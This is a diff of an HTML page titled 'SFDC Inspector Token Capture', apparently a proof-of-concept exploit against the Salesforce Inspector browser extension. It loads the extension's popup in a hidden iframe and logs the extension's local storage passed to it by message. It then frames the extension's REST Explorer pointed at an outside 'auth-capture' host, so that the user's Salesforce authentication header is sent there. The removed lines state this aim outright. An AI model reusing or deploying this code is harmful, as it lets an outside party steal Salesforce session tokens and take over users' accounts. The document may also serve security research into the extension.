@@ -4,49 +4,68 @@
     <title>SFDC Inspector Token Capture</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
-        .container { background: #f5f5f5; padding: 20px; border-radius: 4px; margin-bottom: 20px; }
-        button { padding: 10px 20px; margin: 10px 0; cursor: pointer; }
-        pre { white-space: pre-wrap; background: #eee; padding: 10px; }
+        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
+        #requestInfo { background: #e3f2fd; padding: 15px; border-radius: 4px; margin-top: 20px; }
+        .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
+        pre { white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>SFDC Inspector Token Capture</h2>
-        <p>Click below to open the REST Explorer:</p>
-        <button onclick="openExplorer()">Open REST Explorer</button>
-        <div id="status"></div>
-    </div>
-
+    <div id="messages">Initializing...</div>
+    <div id="requestInfo"></div>
     <script>
-        const statusDiv = document.getElementById('status');
-        
-        function openExplorer() {
-            // Direct URL to REST Explorer with our capture endpoint
-            const explorerUrl = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?endpoint=.samanattar.github.io/auth-capture&method=GET&format=json`;
-            
-            // Open in a new tab
-            window.open(explorerUrl, '_blank');
-            
-            statusDiv.innerHTML = `
-                <h3>REST Explorer Opened</h3>
-                <p>Please follow these steps:</p>
-                <ol>
-                    <li>In the new tab that opened, wait for the REST Explorer to load</li>
-                    <li>Click the "Send" button</li>
-                    <li>The request will be sent to your capture endpoint with the authentication header</li>
-                </ol>
-            `;
+        const messagesDiv = document.getElementById('messages');
+        const requestInfoDiv = document.getElementById('requestInfo');
+        let initialized = false;
+
+        function createExplorerUrl() {
+            const params = new URLSearchParams({
+                endpoint: '.samanattar.github.io/auth-capture',
+                method: 'GET',
+                format: 'json'
+            });
+            return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
         }
 
-        // Show initial instructions
-        statusDiv.innerHTML = `
-            <h3>Instructions:</h3>
-            <ol>
-                <li>Make sure you're logged into Salesforce</li>
-                <li>Click the "Open REST Explorer" button above</li>
-                <li>In the new tab, click "Send" to make the request</li>
-            </ol>
-        `;
+        // Handle messages from the extension
+        window.addEventListener('message', function(event) {
+            // Ignore React DevTools messages
+            if (event.data.source?.includes('react-devtools')) {
+                return;
+            }
+
+            // Log non-React messages for debugging
+            console.log('Received non-React message:', event.data);
+
+            if (event.data.insextInitRequest && !initialized) {
+                initialized = true;
+                console.log('Initializing with storage:', event.data.iFrameLocalStorage);
+
+                const storage = event.data.iFrameLocalStorage || {};
+                // Get only org instances
+                const instances = Object.keys(storage)
+                    .filter(key => key.endsWith('_orgInstance'))
+                    .map(key => storage[key]);
+
+                if (instances.length > 0) {
+                    messagesDiv.innerHTML = `<h3>Connected! Loading REST Explorer...</h3>`;
+                    
+                    // Create and load the explorer frame
+                    const explorerFrame = document.createElement('iframe');
+                    explorerFrame.src = createExplorerUrl();
+                    explorerFrame.className = 'explorer-frame';
+                    document.body.appendChild(explorerFrame);
+                } else {
+                    messagesDiv.innerHTML = '<h3>No Salesforce orgs found. Please make sure you are logged in.</h3>';
+                }
+            }
+        });
+
+        // Load the extension popup in a hidden iframe for initialization
+        const initFrame = document.createElement('iframe');
+        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
+        initFrame.style.display = 'none';
+        document.body.appendChild(initFrame);
     </script>
 </body>
 </html>
